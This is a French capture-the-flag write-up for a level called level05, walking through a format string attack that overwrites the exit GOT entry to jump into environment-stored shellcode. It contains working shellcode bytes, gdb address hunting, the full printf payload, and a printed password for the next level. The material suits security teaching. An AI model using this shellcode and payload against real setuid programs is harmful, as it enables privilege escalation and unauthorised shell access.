# LEVEL 05

On trouve un binaire level05 à la racine du répo, contenant une fonction **main**.

En traduisant le code (**source.c**), le programme commence avec un **fgets** qui lit sur stdin.  Par la suite, un **tolower** est appliqué sur la string reçu.
La string est alors affiché par un **printf** avant que le programme appele un **exit**.

**Printf** ne prennant pas d'argument, on va pouvoir exploiter sont fonctionnement avec un **SHELLCODE**.

On commence par ajouter notre **SHELLCODE** aux variables d'environnements afin de récuperer son adresse plus tard :

```bash
> export SHELLCODE=`python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80"'`
```

Avec gdb, nous allons cherché l'adresse de notre **SHELLCODE**, on va ensuite récupérer une adresse qui pointe au milieu de notre **nop slide**.
On en profite pour récupérer l'adresse dans la **GOT** qui jump vers la fonction **exit** :

```gdb
gdb -q level05
Reading symbols from /home/users/level05/level05...(no debugging symbols found)...done.
(gdb) b *main
Breakpoint 1 at 0x8048444
(gdb) run
Starting program: /home/users/level05/level05

Breakpoint 1, 0x08048444 in main ()
(gdb) x/200xs environ
...
0xffffd867:      "SHELLCODE=\220\220\220\220\220....
...
(gdb) x/200sx 0xffffd867
0xffffd867:     0x4c454853      0x444f434c      0x90903d45      0x90909090
0xffffd877:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd887:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd897:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd8a7:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd8b7:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd8c7:     0x90909090      0x90909090      0x90909090      0xc0319090
....

(gdb) disas exit
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:     jmp    *0x80497e0
   0x08048376 <+6>:     push   $0x18
   0x0804837b <+11>:    jmp    0x8048330
End of assembler dump.
(gdb) x 0x80497e0
0x80497e0 <exit@got.plt>:       0x08048376
(gdb) x 0x80497e2
0x80497e2 <exit@got.plt+2>:     0x83860804

```

> addresse dans la nop slide : 0xffffd887
> addresse du exit :  0x80497e0
> addresse du exit + 2 :  0x80497e2

Maintenant on va chercher l'offset de notre printf :

```bash
> (python -c "print 'B' * 4 + '|%08x ' * 15") | ./level05
bbbb|00000064 |f7fcfac0 |f7ec3af9 |ffffd6df |ffffd6de |00000000 |ffffffff |ffffd764 |f7fdb000 |62626262 |3830257c |257c2078 |20783830 |3830257c |257c2078
```

Notre offset apparait au niveau de nos `b` (62 en valeur hexadecimale), au 10 ème octet dans notre **stack**. On sait donc que notre première argument lu par **printf** sera à cette addresse.
On va chercher à ecrire la valeur décimale de notre nop slide au niveau de l'addresse du exit. Pour ça, on va employer la méthode du **format string attack**, **2 bytes by 2 bytes**, Donc écrire les 2 premiers bytes de l'addresse de notre  **nop slide** puis les deux suivants car il serait trop lent d'insérer  la totalité en une fois, cela nous ferais une taille de champ trop grande (+ de 4 milliard !).

```bash
(python -c "print '\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%55423c' + '%10\$hn'+ '%10104c' + '%11\$hn'"; cat) | ./level05
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```

###### VICTORY